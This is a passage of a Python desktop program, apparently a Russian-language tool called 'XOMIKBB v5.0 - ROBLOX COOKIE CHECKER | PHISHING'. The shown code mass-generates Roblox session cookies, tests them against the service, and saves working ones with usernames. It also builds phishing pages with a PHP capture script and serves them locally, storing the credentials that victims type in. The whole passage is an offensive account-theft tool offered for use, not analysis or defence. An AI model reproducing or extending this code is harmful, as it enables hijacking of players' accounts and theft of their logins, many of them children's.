        tk.Checkbutton(checker_frame, text="Проверять дубликаты", variable=self.check_duplicates_var,
                       bg=self.bg_color, fg=self.fg_color, selectcolor=self.bg_color).pack(anchor=tk.W, padx=10, pady=5)
        
        self.timeout_var = tk.StringVar(value=str(self.config.get("timeout", 15)))
        tk.Frame(checker_frame, bg=self.bg_color).pack(pady=5)
        tk.Label(checker_frame, text="Таймаут (сек):", bg=self.bg_color, fg=self.fg_color).pack(side=tk.LEFT, padx=10)
        tk.Entry(checker_frame, textvariable=self.timeout_var, width=10, bg=self.console_bg, fg=self.fg_color).pack(side=tk.LEFT)
        
        # Кнопка сохранения
        tk.Button(settings_frame, text="💾 СОХРАНИТЬ ВСЕ НАСТРОЙКИ", command=self.save_all_settings,
                  bg="#00aa00", fg="white", font=("Arial", 12, "bold"), padx=30, pady=10).pack(pady=20)
        
        # Информация о папках
        info_frame = tk.LabelFrame(settings_frame, text="📁 ПАПКИ ПРОГРАММЫ", 
                                    fg=self.fg_color, bg=self.bg_color)
        info_frame.pack(fill=tk.X, pady=10)
        
        for name, path in FOLDERS.items():
            tk.Label(info_frame, text=f"{name}: {path}", 
                     bg=self.bg_color, fg="#888888", font=("Arial", 9)).pack(anchor=tk.W, padx=10, pady=2)
    
    # =================================================================
    # МЕТОДЫ ЧЕКЕРА
    # =================================================================
    def log_to_console3(self, msg, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if hasattr(self, 'console3'):
            self.console3.insert(tk.END, f"[{timestamp}] [{level}] {msg}\n")
            self.console3.see(tk.END)
            self.root.update()
    
    def log_to_console1(self, msg, is_valid=False):
        if hasattr(self, 'console1'):
            if is_valid:
                self.console1.insert(tk.END, f"[WORKING] ✅ {msg}\n")
            else:
                self.console1.insert(tk.END, f"[NOT WORKING] ❌ {msg}\n")
            self.console1.see(tk.END)
            self.root.update()
    
    def load_settings_to_ui(self):
        try:
            if hasattr(self, 'gen_count'):
                self.gen_count.delete(0, tk.END)
                self.gen_count.insert(0, str(self.config.get('generate_count', 10)))
                self.gen_length.delete(0, tk.END)
                self.gen_length.insert(0, str(self.config.get('cookie_length', 1500)))
                self.check_delay.delete(0, tk.END)
                self.check_delay.insert(0, str(self.config.get('check_delay', 0.5)))
                self.auto_save_valid.set(self.config.get('auto_save_valid', True))
                self.auto_save_invalid.set(self.config.get('auto_save_invalid', True))
        except:
            pass
    
    def save_all_settings(self):
        try:
            self.config['check_duplicates'] = self.check_duplicates_var.get()
            self.config['timeout'] = int(self.timeout_var.get())
            self.config['phishing_port'] = int(self.phishing_port.get())
            self.config['phishing_template'] = self.template_var.get()
            self.config['theme'] = self.theme_var.get()
            self.config['font_family'] = self.font_var.get()
            self.config['font_size'] = int(self.font_size_var.get())
            
            if hasattr(self, 'gen_count'):
                self.config['generate_count'] = int(self.gen_count.get())
                self.config['cookie_length'] = int(self.gen_length.get())
                self.config['check_delay'] = float(self.check_delay.get())
                self.config['auto_save_valid'] = self.auto_save_valid.get()
                self.config['auto_save_invalid'] = self.auto_save_invalid.get()
            
            if save_config(self.config):
                messagebox.showinfo("Успех", "Настройки сохранены!\nПерезапустите программу для применения темы и шрифта.")
            else:
                messagebox.showerror("Ошибка", "Не удалось сохранить настройки")
        except Exception as e:
            messagebox.showerror("Ошибка", str(e))
    
    def reset_duplicates(self):
        global checked_cookies_hash
        checked_cookies_hash.clear()
        self.log_to_console3("Список дубликатов сброшен!", "SUCCESS")
    
    def clear_consoles(self):
        if hasattr(self, 'console1'):
            self.console1.delete(1.0, tk.END)
            self.console2.delete(1.0, tk.END)
            self.console3.delete(1.0, tk.END)
            self.progress['value'] = 0
    
    def start_check(self):
        if self.is_checking:
            return
        self.is_checking = True
        self.stop_flag = False
        self.start_btn.config(state=tk.DISABLED, text="🔄 РАБОТАЕТ...")
        threading.Thread(target=self._run_check, daemon=True).start()
    
    def _run_check(self):
        try:
            count = int(self.gen_count.get())
            length = int(self.gen_length.get())
            delay = float(self.check_delay.get())
            timeout = self.config.get('timeout', 15)
            auto_valid = self.auto_save_valid.get()
            auto_invalid = self.auto_save_invalid.get()
            
            self.root.after(0, self.clear_consoles)
            self.log_to_console3("=== ЗАПУСК ПРОВЕРКИ v5.0 ===", "SUCCESS")
            
            cookies = generate_cookies(count, length)
            self.log_to_console3(f"Сгенерировано {len(cookies)} cookie", "SUCCESS")
            
            for i, c in enumerate(cookies[:10]):
                self.root.after(0, lambda i=i, c=c: self.console2.insert(tk.END, f"[{i+1}] {c[:80]}...\n"))
            
            valid_count = 0
            invalid_count = 0
            total = len(cookies)
            start_time = time.time()
            
            for i, cookie in enumerate(cookies):
                if self.stop_flag:
                    break
                
                if is_duplicate_cookie(cookie):
                    self.log_to_console3(f"Дубликат пропущен", "WARN")
                    self.root.after(0, lambda val=(i+1)/total*100: self.progress.configure(value=val))
                    continue
                
                self.log_to_console3(f"Проверка {i+1}/{total}...", "INFO")
                self.root.after(0, lambda val=(i+1)/total*100: self.progress.configure(value=val))
                
                is_valid, user_data = check_cookie(cookie, timeout, self.log_to_console3)
                
                if is_valid:
                    username = user_data.get('username', 'Unknown')
                    self.root.after(0, lambda u=username: self.log_to_console1(u, is_valid=True))
                    if auto_valid:
                        save_valid_cookie(cookie, user_data)
                        self.log_to_console3(f"Сохранен рабочий: {username}", "SUCCESS")
                    mark_cookie_as_checked(cookie)
                    valid_count += 1
                else:
                    error = user_data.get('error', 'Unknown')
                    self.root.after(0, lambda e=error: self.log_to_console1(e, is_valid=False))
                    if auto_invalid:
                        save_invalid_cookie(cookie, error)
                    mark_cookie_as_checked(cookie)
                    invalid_count += 1
                
                self.root.after(0, lambda i=i, total=total, v=valid_count, inv=invalid_count: 
                                self.status_label.config(text=f"Проверено: {i+1}/{total} | Рабочих: {v}"))
                time.sleep(delay)
            
            duration = time.time() - start_time
            self.log_to_console3(f"=== ИТОГИ: {valid_count} рабочих, {invalid_count} нерабочих ===", "SUCCESS")
            self.log_to_console3(f"Время: {duration:.1f} сек", "INFO")
            
        except Exception as e:
            self.log_to_console3(f"Ошибка: {e}", "ERROR")
        finally:
            self.is_checking = False
            self.root.after(0, lambda: self.start_btn.config(state=tk.NORMAL, text="🚀 СТАРТ"))
    
    def stop_check(self):
        if self.is_checking:
            self.stop_flag = True
            self.log_to_console3("Остановка проверки...", "WARN")
    
    # =================================================================
    # МЕТОДЫ ФИШИНГА
    # =================================================================
    def create_phishing(self):
        try:
            port = int(self.phishing_port.get())
            template = self.template_var.get()
            result = generate_phishing_page(template, port)
            
            self.phishing_console.delete(1.0, tk.END)
            self.phishing_console.insert(tk.END, "🎣 ФИШИНГ СТРАНИЦА СОЗДАНА!\n")
            self.phishing_console.insert(tk.END, "=" * 50 + "\n\n")
            self.phishing_console.insert(tk.END, f"📁 HTML файл: {result['html']}\n")
            self.phishing_console.insert(tk.END, f"📁 PHP скрипт: {result['php']}\n")
            self.phishing_console.insert(tk.END, f"📁 Запуск сервера: {result['bat']}\n\n")
            self.phishing_console.insert(tk.END, f"🌐 URL: {result['url']}\n")
            self.phishing_console.insert(tk.END, f"🎭 Шаблон: {PHISHING_TEMPLATES[template]['name']}\n\n")
            self.phishing_console.insert(tk.END, "=" * 50 + "\n")
            self.phishing_console.insert(tk.END, "Для запуска сервера:\n")
            self.phishing_console.insert(tk.END, "1. Запустите start_server_port_{port}.bat\n")
            self.phishing_console.insert(tk.END, "2. Откройте браузер и перейдите по ссылке\n")
            self.phishing_console.insert(tk.END, "3. Введенные данные сохранятся в папке phishing\n")
            self.phishing_console.see(tk.END)
            
            messagebox.showinfo("Успех", f"Фишинг страница создана!\nURL: {result['url']}")
            
        except Exception as e:
            self.phishing_console.insert(tk.END, f"❌ Ошибка: {e}\n")
            messagebox.showerror("Ошибка", str(e))
    
    def start_phishing_server(self):
        try:
            port = int(self.phishing_port.get())
            phishing_folder = FOLDERS["phishing"]
            
            # Запускаем сервер в отдельном окне
            subprocess.Popen(f'start cmd /k "cd /d "{phishing_folder}" && echo 🌐 XOMIKBB PHISHING SERVER && echo 📁 Папка: {phishing_folder} && echo 🌐 http://localhost:{port} && echo. && python -m http.server {port}"', 
                           shell=True)
            
            self.phishing_console.insert(tk.END, f"🌐 Сервер запущен на порту {port}\n")
            self.phishing_console.insert(tk.END, f"📁 Папка: {phishing_folder}\n")
            self.phishing_console.insert(tk.END, f"🌐 URL: http://localhost:{port}\n")
            self.phishing_console.see(tk.END)
            
        except Exception as e:
            self.phishing_console.insert(tk.END, f"❌ Ошибка: {e}\n")
    
    def on_closing(self):
        self.root.destroy()

# =================================================================
# ЗАПУСК
# =================================================================
if __name__ == "__main__":
    print(RGB.rainbow("=" * 70))
    print(RGB.rainbow("XOMIKBB v5.0 - ROBLOX COOKIE CHECKER | PHISHING"))
    print(RGB.rainbow("X-GEN | Earth-8847"))
    print(RGB.rainbow("=" * 70))
    
    create_all_folders()
    
    root = tk.Tk()
    app = XOMIKBBApp(root)
    root.mainloop()
